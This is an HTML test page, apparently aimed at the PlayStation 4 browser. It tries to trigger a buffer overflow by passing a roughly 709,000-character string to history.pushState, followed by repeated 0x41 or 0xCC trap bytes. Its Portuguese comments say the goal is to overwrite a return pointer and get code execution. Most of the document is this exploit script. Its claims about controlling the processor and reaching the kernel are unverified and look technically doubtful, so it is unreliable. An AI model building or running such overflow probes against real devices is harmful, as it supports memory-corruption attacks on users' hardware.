<!DOCTYPE html>
<html>
<head>
    <title>PS4 Execution Test (INT 3)</title>
    <style>
        body { background-color: #000; color: #fff; font-family: monospace; padding: 20px; text-align: center; }
        button { 
            font-size: 24px; padding: 20px; margin: 20px; cursor: pointer; 
            width: 90%; border: none; font-weight: bold;
        }
        .btn-slide { background-color: #3498db; color: white; }
        .btn-trap { background-color: #e74c3c; color: white; border: 4px solid yellow;}
        #log { border: 1px solid #555; padding: 15px; color: yellow; font-size: 18px; margin-top: 20px;}
    </style>
</head>
<body>

    <h1>Execução de Código: Teste de Trap</h1>
    <p>Vamos ver se o processador OBEDECE nossas instruções.</p>

    <div id="log">Reinicie o console antes de cada teste!</div>

    <button class="btn-slide" onclick="sendPayload('\x41')">
        1. Injetar 'A' (0x41)<br>
        <small>Se executar: Crash comum ou Slide</small>
    </button>

    <button class="btn-trap" onclick="sendPayload('\xCC')">
        2. Injetar TRAP (0xCC)<br>
        <small>Se executar: Comportamento diferente?</small>
    </button>

    <script>
        const SIZE_SAFE = 709522;

        function log(msg) {
            document.getElementById('log').innerText = msg;
        }

        function sendPayload(byteChar) {
            log("Gerando Payload...");
            
            setTimeout(() => {
                try {
                    // 1. O Padding até a borda
                    let buffer = "A".repeat(SIZE_SAFE);
                    
                    // 2. A Injeção (Tentamos sobrescrever o retorno com isso)
                    // Repetimos o byte 16 vezes para garantir que pegamos o ponteiro
                    buffer += byteChar.repeat(16); 

                    log("Enviando " + buffer.length + " bytes...");
                    
                    // Dispara
                    history.pushState({}, "exec_test", "/" + buffer);
                    
                    log("Aguardando reação do Kernel...");

                } catch (e) {
                    log("Erro JS: " + e.message);
                }
            }, 1000);
        }
    </script>
</body>
</html>
